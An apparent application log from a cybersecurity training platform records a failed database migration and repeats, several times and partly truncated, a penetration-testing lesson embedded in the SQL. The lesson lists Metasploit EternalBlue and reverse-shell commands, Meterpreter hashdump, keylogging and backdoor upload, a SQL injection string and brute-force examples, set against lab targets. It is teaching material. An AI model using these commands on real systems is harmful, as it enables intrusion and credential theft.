### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:56:12.941 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:56:12.943 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:56:13.038 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:56:13.150 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:56:13.150 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:56:13.150 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:56:13.324 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:56:13.362 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:56:13.365 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 7 migrations (execution time 00:00.027s)
2026-03-12 00:56:13.392 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" with baseline ...
2026-03-12 00:56:13.464 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbBaseline - Successfully baselined schema with version: 0
2026-03-12 00:56:13.530 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 0
2026-03-12 00:56:13.557 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:56:13.563 [vert.x-eventloop-thread-1] WARN  o.f.c.i.s.DefaultSqlScriptExecutor - DB: extension "uuid-ossp" already exists, skipping (SQL State: 42710 - Error Code: 0)
2026-03-12 00:56:13.894 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:56:13.949 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
